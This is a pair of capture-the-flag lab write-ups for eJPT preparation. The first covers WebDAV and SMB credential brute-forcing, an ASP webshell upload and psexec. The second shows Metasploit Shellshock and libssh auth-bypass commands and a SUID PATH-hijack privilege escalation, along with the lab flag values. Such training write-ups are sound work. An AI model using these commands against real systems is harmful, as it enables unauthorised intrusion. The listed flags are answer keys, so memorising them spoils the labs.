
CTF: Host & Network Penetration Testing - System/Host Based Attacks (4 Flags)

Objective: Complete a two-target CTF by retrieving four flags across a WebDAV-exposed IIS server and an SMB-exposed Windows machine using credential attacks, file upload exploitation, and remote code execution.
Target 1 - WebDAV (Flags 1 and 2):

Identified HTTP Basic Auth on port 80 via Nmap script scan; brute-forced credentials for user bob using Hydra with the unix_passwords wordlist
Logged into the WebDAV share via cadaver and retrieved Flag 1 from the share directory
Used davtest to confirm .asp file execution is permitted; uploaded a pre-built ASP webshell from /usr/share/webshells/asp/ via WebDAV
Accessed the webshell through the browser and ran dir C:\ to locate and read flag2.txt from the C drive root


Target 2 - SMB (Flags 3 and 4):

Confirmed SMB on port 445 via Nmap; used Metasploit smb_login auxiliary module to brute-force credentials and recover the Administrator account password
Used exploit/windows/smb/psexec with recovered Administrator credentials to establish a Meterpreter session
Dropped to shell from Meterpreter; retrieved Flag 3 from C:\ root and Flag 4 from C:\Users\Administrator\Desktop


Impact: Demonstrates a full multi-target engagement across two different protocols and attack surfaces. Both flags chains required zero CVE exploitation. All access was gained through credential abuse and misconfiguration, which reflects the most common real-world attack path in enterprise environments.


# Host & Network Penetration Testing: System/Host Based Attacks CTF 2
### Linux: Shellshock RCE + libssh Authentication Bypass + SUID Binary PATH Hijacking
**eJPT Exam Preparation | INE Attack Defense Labs | May 2026**

---

## Objective

Recover all four flags across two Linux targets by exploiting a Shellshock vulnerability on a CGI-enabled Apache web server (target 1) and chaining a libssh authentication bypass with a SUID binary PATH hijack to reach root (target 2).

---

## Environment

| Field | Value |
|---|---|
| Target 1 IP | 192.4.147.3 (target1.ine.local) |
| Target 1 OS | Ubuntu 14.04, Apache httpd 2.4.6 |
| Target 1 Access | Shellshock via /browser.cgi, Metasploit |
| Target 1 Starting User | daemon (Apache process account) |
| Target 1 Final User | daemon (no escalation required) |
| Target 2 IP | 192.158.30.4 (target2.ine.local) |
| Target 2 OS | Linux (libssh 0.8.3, protocol 2.0) |
| Target 2 Access | libssh authentication bypass, Metasploit |
| Target 2 Starting User | user |
| Target 2 Final User | root |
| Attack Types | CVE-2014-6271 (Shellshock), CVE-2018-10933 (libssh auth bypass), SUID PATH hijack |
| Tools Used | nmap, Firefox, Metasploit (msf6), strings, cp, rm |

---

## Attack Chain

```
Target 1
--------
ping -c 2 target1.ine.local (192.4.147.3, TTL=64, Linux)
    |
nmap -sV -> port 80/tcp, http, Apache httpd 2.4.6
    |
Browse 192.4.147.3/browser.cgi -> CGI endpoint confirmed (email form active)
    |
nmap --script=http-shellshock --script-args "http-shellshock.uri=/browser.cgi"
    -> VULNERABLE, CVE-2014-6271
    |
Metasploit: exploit/multi/http/apache_mod_cgi_bash_env_exec
    RHOSTS=192.4.147.3, LHOST=192.4.147.2, LPORT=1234, TARGETURI=/browser.cgi
    -> Meterpreter session 1 (daemon)
    |
cat /opt/apache/htdocs/.flag.txt  ->  FLAG2_3d365c03ff4b453da23b7fc0be0fa63a
cat /flag.txt                     ->  FLAG1_5dbe31131a0848fabe8bf41586cd0422

Target 2
--------
ping -c 2 target2.ine.local (192.158.30.4, TTL=64, Linux)
    |
nmap -sV -> port 22/tcp, ssh, libssh 0.8.3 (protocol 2.0)
    |
Metasploit: auxiliary/scanner/ssh/libssh_auth_bypass
    RHOSTS=192.158.30.4, SPAWN_PTY=true  [first run with SPAWN_PTY=false failed]
    -> Command shell session 2 (user)
    |
sessions -i 2
cat /home/user/flag.txt  ->  FLAG3_a206f133dfb9491cbb908d1f9638196c
    |
ls -al /home/user
    -> welcome (-rwsr-xr-x, root, SUID set)
    -> greetings (-rwx------, root, not user-executable)
    |
strings welcome -> calls "greetings" with no absolute path, imports system()
    |
rm greetings && cp /bin/bash greetings
./welcome  ->  [root@target2 ~]#  (whoami: root)
    |
cat /root/flag.txt  ->  FLAG4_c19a1c97c9c14f16964072fb2ea6269b
```

---

## Key Commands

```bash
# Shellshock vulnerability confirmation
nmap -sV 192.4.147.3 --script=http-shellshock --script-args "http-shellshock.uri=/browser.cgi"

# Metasploit Shellshock exploit (target 1)
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS 192.4.147.3; set LHOST 192.4.147.2; set LPORT 1234; set TARGETURI /browser.cgi
exploit

# libssh auth bypass with PTY allocation (target 2)
use auxiliary/scanner/ssh/libssh_auth_bypass
set RHOSTS 192.158.30.4; set SPAWN_PTY true
run

# SUID binary static analysis
strings welcome   # reveals "greetings" called without absolute path

# PATH hijack payload
rm greetings && cp /bin/bash greetings && ./welcome
```

---

## Flags

| Flag | Path | Value |
|---|---|---|
| Flag 1 | /flag.txt | FLAG1\_5dbe31131a0848fabe8bf41586cd0422 |
| Flag 2 | /opt/apache/htdocs/.flag.txt | FLAG2\_3d365c03ff4b453da23b7fc0be0fa63a |
| Flag 3 | /home/user/flag.txt | FLAG3\_a206f133dfb9491cbb908d1f9638196c |
| Flag 4 | /root/flag.txt | FLAG4\_c19a1c97c9c14f16964072fb2ea6269b |

---

## Technical Notes

- **SPAWN_PTY must be true for libssh_auth_bypass.** The first run with the default `SPAWN_PTY false` opened a session that was immediately marked invalid and closed. Without PTY allocation, the module cannot establish a stable interactive channel. This is not obvious from the module description; `show options` is the diagnostic step.
- **sessions -u 2 produced "Unknown session platform" and stalled.** The shell obtained via libssh bypass does not advertise a recognised Metasploit platform, so the shell-to-Meterpreter upgrade module warns and the handler exits without delivering a new session. Manual privilege escalation from the raw shell was more reliable.
- **rm greetings prompted a write-protected file confirmation.** The file had mode -rwx------ (root-owned, no write for others), but the containing directory /home/user is owned by user with drwx------ permissions, so the user account can delete entries from it. Directory write permission controls file removal, not the file's own permissions.
- **Flag 2 is a hidden file (.flag.txt).** The leading dot hides it from a plain `ls` in most shells. Meterpreter's `ls` displays it regardless. On a raw shell, `ls -al` or `cat .flag.txt` directly would be required.
- **Shellshock is CVE-2014-6271, disclosed 2014-09-24.** The NSE script confirms exploitability and provides the CVE reference, which is the correct output to include in a vulnerability report. The server-header also confirmed Apache/2.4.6 (Unix), consistent with the nmap service version output.
- **The `welcome` binary imports `system` from libc, visible in `strings` output.** The presence of both `system` and a bare filename (`greetings`) in the same binary's string table is a strong indicator of an unsafe `system()` call with a relative path.

---

## Takeaways

- `nmap -sV` version fingerprinting is not just informational: the exact version string determines which CVE applies and which Metasploit module to use.
- A failed Metasploit run with a clear error message is a diagnostic step, not a dead end. Reading the error and checking `show options` resolved the libssh session failure in one iteration.
- SUID binary PATH hijacking requires three things: a SUID binary owned by a privileged user, a call to a program by relative name, and write access to a directory that is searched before the real program's location.
- Directory write permission and file write permission are independent. A user can delete a root-owned file if they have write permission on the directory containing it.
- `strings` on an unknown binary is a fast, dependency-free way to identify what external programs it calls and how it calls them, without a full disassembly.
- Abandoning a stalled upgrade path and working with the shell at hand is a valid and often faster strategy than forcing a tool to do something it is not well suited for in the given environment.

---
